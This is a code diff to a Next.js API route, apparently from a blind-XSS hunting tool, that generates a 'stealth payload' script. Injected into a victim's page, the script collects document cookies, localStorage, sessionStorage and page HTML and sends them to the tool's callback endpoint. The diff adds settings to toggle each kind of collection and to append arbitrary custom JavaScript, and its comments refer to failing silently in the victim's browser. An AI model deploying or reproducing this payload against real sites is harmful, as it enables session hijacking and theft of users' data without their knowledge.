@@ -1,6 +1,15 @@
+import { kv } from '@vercel/kv';
 import { NextResponse } from 'next/server';
 
 export const dynamic = 'force-dynamic';
+
+if (!global._webhooksStore) {
+  global._webhooksStore = {
+    requests: {},
+    configs: {},
+    counts: {}
+  };
+}
 
 export async function GET(request) {
   const { searchParams } = new URL(request.url);
@@ -15,23 +24,51 @@ export async function GET(request) {
     });
   }
 
+  // Fetch configuration
+  const isKvConnected = !!process.env.KV_URL;
+  let savedConfig = null;
+  if (isKvConnected) {
+    try {
+      savedConfig = await kv.get(`webhook:${id}:config`);
+    } catch (e) {
+      console.error('KV Read Error:', e);
+    }
+  } else {
+    savedConfig = global._webhooksStore?.configs?.[id] || null;
+  }
+
+  let configObj = null;
+  if (savedConfig) {
+    try {
+      configObj = typeof savedConfig === 'string' ? JSON.parse(savedConfig) : savedConfig;
+    } catch (e) {
+      console.error('Config Parse Error:', e);
+    }
+  }
+
+  const xssDomEnabled = configObj?.xssDomEnabled !== undefined ? !!configObj.xssDomEnabled : true;
+  const xssCookiesEnabled = configObj?.xssCookiesEnabled !== undefined ? !!configObj.xssCookiesEnabled : true;
+  const xssStorageEnabled = configObj?.xssStorageEnabled !== undefined ? !!configObj.xssStorageEnabled : true;
+  const xssCustomCode = configObj?.xssCustomCode || '';
+
   // Get current host to construct callback reporting URL
   const host = request.headers.get('host') || 'localhost:3000';
   const protocol = host.includes('localhost') ? 'http' : 'https';
   const callbackUrl = `${protocol}://${host}/api/x/callback?id=${id}`;
 
-  // Custom, optimized stealth payload script
+  // Custom, optimized stealth payload script built based on custom endpoints controls
   const payloadScript = `(function() {
   try {
     var data = {
       uri: window.location.href || "",
       ref: document.referrer || "",
-      cookies: document.cookie || "",
+      cookies: ${xssCookiesEnabled ? 'document.cookie || ""' : '"[Omitted by hunter settings]"'},
       local: "",
       session: "",
       dom: ""
     };
 
+    ${xssStorageEnabled ? `
     // Grab LocalStorage safely
     try {
       var ls = {};
@@ -51,7 +88,9 @@ export async function GET(request) {
       }
       data.session = JSON.stringify(ss);
     } catch(e) {}
+    ` : 'data.local = "[Storage collection disabled]"; data.session = "[Storage collection disabled]";'}
 
+    ${xssDomEnabled ? `
     // Grab DOM HTML (Cap at 80KB to avoid excessive storage/payload limits)
     try {
       var rawDom = document.documentElement.outerHTML || "";
@@ -61,6 +100,7 @@ export async function GET(request) {
         data.dom = rawDom;
       }
     } catch(e) {}
+    ` : 'data.dom = "[DOM harvesting disabled by hunter settings]";'}
 
     // Fire callback using beacon or fetch
     if (navigator.sendBeacon) {
@@ -75,6 +115,16 @@ export async function GET(request) {
         body: JSON.stringify(data)
       });
     }
+
+    ${xssCustomCode ? `
+    // Appended Custom JS Payload code from configurations
+    try {
+      ${xssCustomCode}
+    } catch(customErr) {
+      console.error("Webhook Inspector Custom JS Error:", customErr);
+    }
+    ` : ''}
+
   } catch(err) {
     // Fail silently in victim browser
   }
